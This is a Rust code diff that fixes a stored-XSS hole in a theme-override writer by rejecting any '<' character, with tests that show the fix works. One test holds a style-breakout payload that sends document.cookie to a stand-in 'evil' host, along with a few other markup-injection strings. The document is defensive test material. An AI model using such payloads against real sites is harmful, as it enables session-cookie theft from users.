@@ -141,14 +141,36 @@ pub fn read_translations(config_dir: &str) -> Result<serde_json::Value, AppError
     }
 }
 
-/// Validate that `source` is plausible THEMING override TEXT (not binary). The
-/// AX consumes it verbatim as a `:root{…}` CSS-variable block, so we do NOT
-/// parse CSS — we only reject content with embedded NUL bytes (a binary-blob
-/// marker). Returns the trimmed-of-trailing-newline source unchanged otherwise.
+/// Validate that `source` is plausible THEMING override TEXT (not binary) AND
+/// cannot break out of the `<style>` element the AX injects it into (CR-01,
+/// stored-XSS write-side guard — LAYER 1 of the defense-in-depth).
+///
+/// The AX consumes this verbatim inside a `<style id="ax-theme-override">` via
+/// `dangerouslySetInnerHTML`. The HTML tokenizer treats `<style>` as a RAW-TEXT
+/// element: it does NOT CSS-parse the body, it ends the element at the first
+/// literal `</style` (case-insensitive) and will start parsing markup after it.
+/// A stored override of `:root{}</style><script>…</script>` therefore breaks out
+/// of the style block and injects an executable `<script>` onto the UNAUTHENTICATED
+/// end-user login origin (where the Kratos session/CSRF cookies live).
+///
+/// Legitimate CSS NEVER needs a literal `<`: CSS selectors, at-rules, custom
+/// properties and values have no `<` token. So we reject ANY `<` outright — this
+/// makes `</style>`, `<script`, `<!--`, and every other markup-injection vector
+/// structurally impossible to STORE. NUL bytes (a binary-blob marker) are also
+/// rejected. The error is value-free (T-15-10): it never echoes the rejected text.
 fn validate_theme_text(source: &str) -> Result<(), AppError> {
     if source.contains('\0') {
         return Err(AppError::BadRequest(
             "theme override must be plain text (CSS), not binary".into(),
+        ));
+    }
+    // CR-01 (stored-XSS, write-side): reject ANY '<'. Real CSS has no '<' token,
+    // so this can never reject a legitimate theme — but it makes a `</style>`
+    // (or `<script`, `<!--`, etc.) breakout impossible to persist. This is the
+    // authoritative guard; the AX sink ALSO defangs `<` as a second layer.
+    if source.contains('<') {
+        return Err(AppError::BadRequest(
+            "theme override must be CSS only and cannot contain '<' (no HTML/markup)".into(),
         ));
     }
     Ok(())
@@ -396,6 +418,49 @@ mod tests {
         assert!(matches!(err, AppError::BadRequest(_)), "got {err:?}");
         // No file was written (the dir is created but theme.css is absent).
         assert!(!theme_path(&dir).is_file());
+    }
+
+    // ─── CR-01: stored-XSS `</style>` breakout is rejected on write, NO disk write ───
+
+    #[test]
+    fn theme_rejects_style_breakout_xss_with_no_write() {
+        let tmp = tempfile::tempdir().expect("temp config dir");
+        let dir = tmp.path().to_string_lossy().to_string();
+
+        // Seed a known-good file first so we can prove it is UNCHANGED on reject.
+        let good = ":root{--ui-brand:#0a0}";
+        write_theme(&dir, good).unwrap();
+        let before = std::fs::read_to_string(theme_path(&dir)).unwrap();
+
+        // The canonical CR-01 breakout payload: end the <style> element and inject
+        // an executable <script>. It contains '<', so the write-side guard rejects
+        // it with a BadRequest (400) and performs NO disk write.
+        let xss = r#":root{}</style><script>fetch('//evil/'+document.cookie)</script>"#;
+        let err = write_theme(&dir, xss).unwrap_err();
+        assert!(matches!(err, AppError::BadRequest(_)), "got {err:?}");
+        // The prior good file is byte-for-byte untouched (CR-01: no write on reject).
+        assert_eq!(
+            std::fs::read_to_string(theme_path(&dir)).unwrap(),
+            before,
+            "a rejected XSS theme PUT must not touch the stored file (CR-01)"
+        );
+
+        // Any other markup vector with '<' is likewise rejected.
+        for payload in ["<script", "<!--", "a{}</STYLE>", "/* */ <"] {
+            let e = write_theme(&dir, payload).unwrap_err();
+            assert!(matches!(e, AppError::BadRequest(_)), "payload {payload:?} -> {e:?}");
+        }
+    }
+
+    #[test]
+    fn theme_accepts_legitimate_css_variables() {
+        let tmp = tempfile::tempdir().expect("temp config dir");
+        let dir = tmp.path().to_string_lossy().to_string();
+        // Real CSS never needs a '<' token — the guard never false-rejects it.
+        let css = ":root{--ui-brand:#0a0;--button-primary-bg:rgb(10 160 10)}\n\
+                   @media (prefers-color-scheme: dark){:root{--ui-bg:#111}}";
+        write_theme(&dir, css).unwrap();
+        assert_eq!(read_theme(&dir).unwrap(), css);
     }
 
     // ─── translations: valid round-trip, malformed-no-write, non-object reject ───
